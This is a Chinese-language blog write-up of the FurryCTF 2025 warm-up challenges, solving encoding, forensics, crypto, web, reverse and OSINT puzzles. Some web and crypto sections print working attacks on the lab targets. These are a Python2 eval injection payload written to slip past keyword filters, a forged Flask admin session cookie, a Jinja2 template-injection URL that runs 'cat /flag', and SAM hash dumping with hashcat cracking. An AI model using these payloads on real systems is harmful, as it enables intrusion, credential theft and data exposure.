# FurryCTF 2025 热身赛 WP


[热身赛链接](https://furryctf.com/games/5/challenges)

## Misc

### 大伙儿好像太无聊了那就整点无聊的东西（？

观察题目内容：

```
REOREREREREREOREREREREREREOOOREOREREREREOREREREOREREREOOREOREREREREOREREREREREOREOREREREREOOREOREOREOOREREOOREOOREOREOREREREREOOREOREREREREREOREOOOREOREREREOREOOOOREREOREOREOOOREOREREREREREOREOOREOOREREOOREREREREREOREOREOOOOREREOOREREREOREREOOREREREOREREOREOOOOREREOREREREOREOREOREREOREREREREOOREREOOOREOOOREOREOREOREREOOOOREOREOOREREREREOOREOOREREREOOREOOREREREOREOREOREREREOOREREOOREREO
```

注意到一个分布规律：`RE` 总是成对出现，我们将他视为 $1$，`O` 视为 $0$，得到二进制编码如下：

```
10111110111111000101111011101110010111101111101011110010101001100100101011110010111110100010111010000110101000101111101001001100111110101000011001110110011101101000011011101010110111100110001000101010110000101001111001001110010011101010111001100110
```

按照 8 bit 划分：

```
10111110 11111100 01011110 11101110 01011110 11111010 11110010 10100110 01001010 11110010 11111010 00101110 10000110 10100010 11111010 01001100 11111010 10000110 01110110 01110110 10000110 11101010 11011110 01100010 00101010 11000010 10011110 01001110 01001110 10101110 01100110
```

发现解出来是乱码，此时注意到每一组二进制码末尾都是 $0$，而 ASCII 编码表的常规字母的二进制编码都是 $0$ 开头(`00100000~01111111`)，所以考虑翻转一下这个 01 串。

```
01100110011101010111001001110010011110010100001101010100010001100111101101010111011000010110111001101110011000010101111100110010010111110100010101100001011101000101111101001111010100100110010101001111010111110111101001110111011110100011111101111101
```

解码得到 flag：


![1](/image/CTF/furryCTF2025/oreo.png)

### IIS服务器

首先使用 WiresHark 打开。

文件 -&gt; 导出对象 -&gt; HTTP：

![1](/image/CTF/furryCTF2025/iis.png)

找到 `f12g.txt`

打开发现密文：

```
ZnVycnlDVEZ7RGlkX1lvdV9Ob3RlX1RoZV9EaWZmX0luX0Vycm9yX1BhZ2U/fQ==
```

Base64 解密即可。

### PassDump

注意到是 dmp 文件，使用 WinDbg 打开。

执行命令 `!analyze -v`

![1](/image/CTF/furryCTF2025/passdump1.png)

看一下日志，是 `nvlddmkm.sys` 显卡驱动文件导致的蓝屏问题。

其中错误代码为 `116`，这个时间为超时检测和恢复 (Timeout Detection and Recovery) 简称 TDR

![1](/image/CTF/furryCTF2025/passdump3.png)

执行命令 `lm v m nvlddmkm` 查看最后一次编译时间。

Timestamp 这一行就是时间。

至于正在使用的程序，我猜的 Hashcat，猜对了！

### 盲盒

首先打开 excel，把内容全复制出来，发现没有 flag

于是将他后缀改为 `.zip`，解压，在 `xl/sharedStrings.xml` 发现零宽隐写。

![1](/image/CTF/furryCTF2025/manghe.png)

解密

![1](/image/CTF/furryCTF2025/manghe2.png)

### Miscode

首先打开 `.gitattributes`

发现内容如下：

```
*.php linguist-language=7b
*.swift linguist-language=61
*.scala linguist-language=48
*.py linguist-language=66
*.erl linguist-language=76
*.c linguist-language=72
*.f90 linguist-language=47
*.kt linguist-language=37
*.rb linguist-language=53
*.lua linguist-language=57
*.cs linguist-language=69
*.go linguist-language=43
*.m linguist-language=31
*.js linguist-language=74
*.ex linguist-language=36
*.pl linguist-language=31
*.clj linguist-language=68
*.vb linguist-language=5f
*.sh linguist-language=46
*.cpp linguist-language=79
*.r linguist-language=21
*.ml linguist-language=7d
*.ts linguist-language=5f
*.hs linguist-language=6c
*.java linguist-language=75
*.rs linguist-language=54
```

然后还有一堆随机文件。

搜索发现这是个将某个语言后缀名统计为自定义名称的东西。

于是结合 GitHub 此文件的用处，猜测是统计文件后缀的频率，然后排序。

最终用 python 写个脚本，用 hex 解出来 `linguist-language` 的对应密文即可。

## Crypto

### SAM

解压文件，发现目录下有一个 SAM 文件还有一个 SYSTEM 文件。

在 Windows 系统中，密码并不是以明文存储的，而是存储在注册表配置单元（Registry Hives）中，这两个文件是提取本地账户密码的最低配置：

- SAM(Security Accounts Manager)：存储本地用户的账户信息、组信息以及最重要的 NTLM/LM 密码哈希。

- SYSTEM(System Hive)：存储了系统的启动信息。最关键的是，它包含了用于解密 SAM 文件中哈希值的 Boot Key（Syskey）

开一下 WSL，在该目录下执行命令 `samdump2 SYSTEM SAM`

![1](/image/CTF/furryCTF2025/sam1.png)

furryCTF 账户密码的 NTLM 加密就是：

{{&lt; admonition note&gt;}}
`861bd8bac91cac40013172f47ab784a4`
{{&lt; /admonition &gt;}}


题面描述到他的密码形式为 `?l?l?l?l?l?s......（最后三位忘了.jpg）`

所以使用 Hashcat 进行掩码攻击。

```shell
hashcat -m 1000 -a 3 861bd8bac91cac40013172f47ab784a4 ?l?l?l?l?l?s?a?a?a
```

由于数量级很高，我的显卡和 CPU太垃圾了，于是租一台 5090 在 4min 就爆破出来了！

![1](/image/CTF/furryCTF2025/sam2.png)

密码是 `robin@0w0`

## Web

### DeepSleep

发现题目所给的代码中有 Python2 注入漏洞 (RCE)

```python
question = input(&#34;&#34;).decode(&#39;utf-8&#39;)
```

在 Python2 中 `input()` 等同于 `eval(raw_input())`，它会尝试将输入的内容作为 Python 表达式进行求值。

测试一下：

![1](/image/CTF/furryCTF2025/deep1.png)

发现得到了 246，说明存在漏洞。

那么构造 Payload：

```Python
str(getattr(getattr(__builtins__, &#39;ope&#39; &#43; &#39;n&#39;)(&#39;fl&#39; &#43; &#39;ag&#39;), &#39;re&#39; &#43; &#39;ad&#39;)().encode(&#39;hex&#39;))
```

`open()` 是 `__builtins__` 模块里的一个属性，通过反射机制 `getattr()` 配合字符串拼接，可以避开静态扫描。

然后把 open 和 flag 拆开可以避免关键词检测。

`.encode(&#39;hex&#39;)` 可以避免后端会检查执行结果是否包含 `furryCTF{}`

![1](/image/CTF/furryCTF2025/deep2.png)

![1](/image/CTF/furryCTF2025/deep3.png)

### 固若金汤

题面提示到 dirsearch 有惊喜，扫一下：

![1](/image/CTF/furryCTF2025/gu1.png)

是 Git 源码泄露。

使用 Githack 将源码拉下来，发现了 `app.py` 和 `config.py`

![1](/image/CTF/furryCTF2025/gu2.png)

```python{title=&#34;config.py&#34;}
import os
# Auto-generated by KMS rotation service
SECRET_KEY = os.urandom(32)
SECRET_KEY_FALLBACKS = [&#34;This_key_has_been_deprecated_v2023&#34;]
```

`SECRET_KEY` 使用了 `os.urandom(32)`，这意味着每次应用重启，密钥都会变，我们无法预测当前的密钥。

开发者留了一个后门 `SECRET_KEY_FALLBACKS`，里面包含了一个硬编码的字符串：`This_key_has_been_deprecated_v2023`

在 Flask 的某些配置或旧版本兼容实现中，系统往往会允许使用 FALLBACKS 中的旧密钥来验证 Session。我们可以利用它伪造 cookie

`app.py` 中的关键信息：

![1](/image/CTF/furryCTF2025/gu3.png)

这是一个服务端模板注入 (SSTI)

只要 Session 中包含 `{&#39;role&#39;: &#39;admin&#39;}`，就可以验证。

使用 `flask-unsign` 工具伪造 cookie
```shell
C:\Users\10927&gt;flask-unsign --sign --cookie &#34;{&#39;role&#39;: &#39;admin&#39;}&#34; --secret &#34;This_key_has_been_deprecated_v2023&#34;
eyJyb2xlIjoiYWRtaW4ifQ.aVtslQ.eWu6ElOxsMyhyeYaIoMeOVDq-lM
```

在 F12 cookie 里面添加一个键名为 `session` 键值为 `eyJyb2xlIjoiYWRtaW4ifQ.aVtslQ.eWu6ElOxsMyhyeYaIoMeOVDq-lM` 的。

发现已经验证为了管理员：

![1](/image/CTF/furryCTF2025/gu4.png)

构造 Payload

```
http://ctf.furryctf.com:32780/?u={{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat /flag&#39;).read()}}
```

![1](/image/CTF/furryCTF2025/gu5.png)

## Reverse

### 猜数字

打开 `IDA Pro`，`Shift &#43; F12` 查找字符串。

![1](/image/CTF/furryCTF2025/getflag1.png)

## OSINT

### Osint master

右下角可以看出是都江堰，然后根据提示和 AI，锁定了**鲤鱼沱大桥**

然后百度地图随便找找，找到了地点。

&lt;div align=&#34;center&#34;&gt;
  &lt;img src=&#34;/image/CTF/furryCTF2025/osintmaster1.png&#34; width=&#34;300&#34; /&gt;
&lt;/div&gt;

&lt;div align=&#34;center&#34;&gt;
  &lt;img src=&#34;/image/CTF/furryCTF2025/osintmaster2.png&#34; width=&#34;300&#34; /&gt;
&lt;/div&gt;

---

> 作者: [凌乱之风](https://github.com/messywind)  
> URL: https://blog.messywind.top/posts/ctf-furryctf-2025-%E7%83%AD%E8%BA%AB%E8%B5%9B/  

